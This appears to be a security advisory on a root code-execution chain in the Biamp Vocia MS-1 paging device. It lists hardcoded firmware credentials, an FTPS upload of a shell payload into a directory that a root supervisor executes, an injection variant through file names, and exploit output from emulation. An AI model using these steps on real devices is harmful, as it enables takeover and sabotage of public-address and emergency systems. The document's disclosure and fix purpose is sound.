# Biamp Vocia MS-1 Unauthenticated Root RCE - Technical Analysis

## 1. Overview

The Biamp Vocia MS-1 is a closed-source IP PA / paging / intercom device (CII infrastructure) that provides public-address, paging, and intercom services in transportation hubs, government buildings, schools, and hospitals. It runs Debian i386 Linux and exposes six network services through an inetd superserver. The vsftpd FTPS service (port 8050) uses the hardcoded service account `ftpsuser:ftpsuser` (CWE-798), baked into the firmware `.deb` postinst and shared by every deployment worldwide — it cannot be changed per device and is not randomized at first boot. The account is chroot-exempt and can write to `/var/opt/vocia/Bins/` (mode 0775, group-writable). The `mum` supervisor process runs as `root` and every ~10 seconds executes any file it finds in that directory via unquoted, unescaped `system()` calls with no signature verification (CWE-78 + CWE-494 + CWE-250). The result is default-configuration unauthenticated root RCE.

## 2. Vulnerability Summary

- **Root cause**: hardcoded FTPS credentials + supervisor that blindly executes files in a world-writable-by-design directory
- **CWE**: CWE-798 (hardcoded credentials), CWE-78 (OS command injection), CWE-494 (download of code without integrity check), CWE-250 (execution with unnecessary privileges), CWE-732 (incorrect permission assignment)
- **CVSS 3.1**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Impact**: unauthenticated root code execution on the device; full control of public-address and intercom infrastructure

## 3. Authentication Boundary

The FTPS service accepts the hardcoded credentials with no per-device variation, effectively removing the authentication barrier (CWE-798):

```bash
# /var/lib/dpkg/info/ms1.postinst (line 86) - baked into firmware .deb
echo -e 'ftpsuser\nftpsuser\n' | passwd ftpsuser    # -> ftpsuser:ftpsuser
```

`crypt.crypt()` verification matches all three hashes. No MITM, local service hop, or authentication step is required.

The device also exposes a separate rsync service with the hardcoded credentials `filecopy:filecopy` (ms1.postinst line 90) and a `vtp:vtp` account (line 93). These are part of the same firmware-level credential class: every MS-1 shipped worldwide shares the same service passwords, there is no per-device randomization at provisioning, and no first-boot password override is enforced. This makes the entire device management plane effectively unauthenticated for anyone who has studied the firmware. The vsftpd configuration additionally enables anonymous login, and the `ftpsuser` account is listed in `/etc/vsftpd_ssl.chroot_list`, which grants chroot exemption — the account can navigate to any directory on the filesystem rather than being confined to a home directory.

## 4. Attack Surface

| Port | Service | Credentials |
|---|---|---|
| 873 | rsync (module `vocia`, path `/var/opt/vocia/tmp`) | `filecopy:filecopy` (hardcoded) |
| 8030 | configserv-gw | proprietary |
| 8035 | interworld | proprietary paging |
| 8040 | alarmserv-gw | proprietary |
| 8041 | schedserv-gw | proprietary |
| 8050 | vsftpd FTPS | **ftpsuser:ftpsuser (hardcoded) + anonymous** |

`/etc/vsftpd_ssl.chroot_list` lists `ftpsuser` -> chroot exemption; `Bins/` is mode 0775 owned by uid/gid 1002 (the `ftpsuser` group), so the account has group-write access. rsync and anonymous FTPS paths cannot write `Bins/` — the ftpsuser FTPS path is the only write vector.

## 5. Sink Identification

`mum` supervisor (`/opt/vocia/mum`, ELF 32-bit i386, not stripped), `check_for_new_bins()` @ 0x080491cb (main.c:361):

```c
// main.c:210 (0x08048e5d)
system("mv /var/opt/vocia/Bins/%s /opt/vocia/\n");   // %s raw, no quoting/escaping
// main.c:219 (0x08048ec8)
system("chmod 775 /opt/vocia/%s \n");
// main.c:190 (0x08048dc9) - check_process() respawn
system("/opt/vocia/%s &\n");                          // executes attacker file as root
// main.c:60 (0x08048a9b)
system("pkill -SIGKILL -f %s\n");
```

The execution user is root: the init chain (`etc/rc2.d/S99vocia-mum` -> `/opt/vocia/neverending-mum.sh`) never drops privileges. There is no integrity check: a strings scan finds zero `sha/md5/sign/verify/magic/hash/gpg/openssl/x509/cert`; `SystemCallSucceeded` only checks `WIFEXITED && WEXITSTATUS==0`.

## 6. Source Identification

The source is the ftpsuser FTPS write path to `/var/opt/vocia/Bins/`:

- vsftpd config: `write_enable=YES`, `chroot_list_enable=YES`, `chroot_list_file=/etc/vsftpd_ssl.chroot_list`
- `ftpsuser` uid 1002, primary gid 1002 -> group-write on `Bins/` (0775)
- `vocia.pem` self-signed cert (2019-2029) enables TLSv1.2

The attacker uploads a shell script named as a `vociaprocs` entry (e.g. `astmon`) to `Bins/`.

## 7. Data Flow

```
Attacker
  -> FTPS (port 8050) login ftpsuser:ftpsuser   <- CWE-798 hardcoded
  -> CWD /var/opt/vocia/Bins  (0775, group-writable)
  -> STOR astmon  (content = #!/bin/sh\n{ cmd ; } > marker 2>&1)
  -> mum supervisor (ROOT, ~10s loop) scans Bins/
     -> copy_proc_image("astmon"):
        system("mv /var/opt/vocia/Bins/astmon /opt/vocia/")    <- raw %s
        system("chmod 775 /opt/vocia/astmon")
     -> check_process(): system("/opt/vocia/astmon &")         <- ROOT exec
  -> /opt/vocia/astmon executes as root
     -> { id; whoami; hostname; } > /var/opt/vocia/tmp/rce_proof_biamp 2>&1
  -> marker: uid=0(root) ... <- ROOT RCE
```

## 8. Exploit Construction

Primitive B (content replacement — used in dynamic verification):

1. FTPS login `ftpsuser:ftpsuser`.
2. `CWD /var/opt/vocia/Bins`.
3. `STOR astmon` with payload `#!/bin/sh\n{ <CMD> ; } > /var/opt/vocia/tmp/rce_proof_biamp 2>&1\n`.
4. Within ~10s the `mum` loop runs mv -> chmod 775 -> `/opt/vocia/astmon &` (root exec).
5. Read the marker back via the rsync module `vocia` (`filecopy:filecopy`, path `/var/opt/vocia/tmp`) to confirm root.

Primitive A (command injection into the `mv`/`pkill` `system()` calls via a filename containing `;`/`$()`/backticks) is statically reachable but dynamically rejected by vsftpd's filename validation (`553 Could not create file`); the exploit script falls back to primitive B. `astmon` is the least-critical `vociaprocs` entry, minimizing device disruption.

The upload itself is a plain FTPS session using TLS (the device ships a self-signed `vocia.pem` certificate valid 2019-2029). The attacker connects to port 8050, authenticates with `ftpsuser:ftpsuser`, issues `CWD /var/opt/vocia/Bins`, and `STOR astmon` with a shell script body. Because `Bins/` is mode 0775 with owner uid/gid 1002 and `ftpsuser` has primary gid 1002, the group-write bit allows the upload without any further privilege. No file signature, checksum, or naming validation is applied by the supervisor before execution — the only requirement is that the file name matches a `vociaprocs` entry so the supervisor's process bookkeeping treats it as a known process.

## 9. Dynamic Verification

Verified under QEMU TCG emulation of the MS-1 i386 rootfs (all ports bound to loopback):

```
python3 exploit.py 127.0.0.1 8051 8730 "id; whoami; hostname"

Marker (/var/opt/vocia/tmp/rce_proof_biamp):
  uid=0(root) gid=0(root) groups=0(root)
  root
  ms1-vocia
```

The marker was read back over the rsync channel and independently confirmed via the guest serial console (`cat /var/opt/vocia/tmp/rce_proof_biamp; ls -la /opt/vocia/astmon; ps aux | grep mum`).

## 10. Reachability & Impact

- **Default configuration**: fully reachable — hardcoded credentials, root-run supervisor, and 0775 `Bins/` are all factory defaults.
- **No authentication**: the hardcoded credentials act as an unauthenticated entry.
- **Impact**: root RCE on devices deployed in transportation hubs, government, schools, and hospitals; public-address and intercom services can be disrupted or weaponized.

The MS-1 is representative of the broader Vocia family: the same supervisor architecture and hardcoded-credential pattern are shared across the Vocia product line, so adjacent models should be audited for the identical issue. Because the device serves public-address and emergency-communication functions, a compromise can be leveraged to broadcast false announcements, silence alarm paging, or pivot from the device's network segment into adjacent infrastructure. The `mum` supervisor also respawns replaced binaries on every loop, giving an attacker a persistence primitive: any payload placed in `Bins/` is re-executed at ~10-second intervals as long as it remains present.

## 11. Fix Recommendations

1. Replace the hardcoded FTPS credentials with per-device randomized credentials at provisioning time.
2. Enforce signature verification before the supervisor executes any file in `Bins/`.
3. Run the `mum` supervisor under a least-privilege account.
4. Restrict management network access to these devices; isolate them from general-purpose networks.

## 12. CWE / CVSS

- **CWE-798** — hardcoded credentials
- **CWE-78** — OS command injection
- **CWE-494** — download of code without integrity check
- **CWE-250** — execution with unnecessary privileges
- **CWE-732** — incorrect permission assignment
- **CVSS 3.1**: **9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

The CVSS reflects the unauthenticated, default-configuration nature of the chain: no credentials beyond the publicly-known hardcoded values, no interactive user, and no special conditions beyond network reachability of the FTPS port. The confidentiality, integrity, and availability impact are all High because the compromise yields root on a device that is part of critical communication infrastructure.
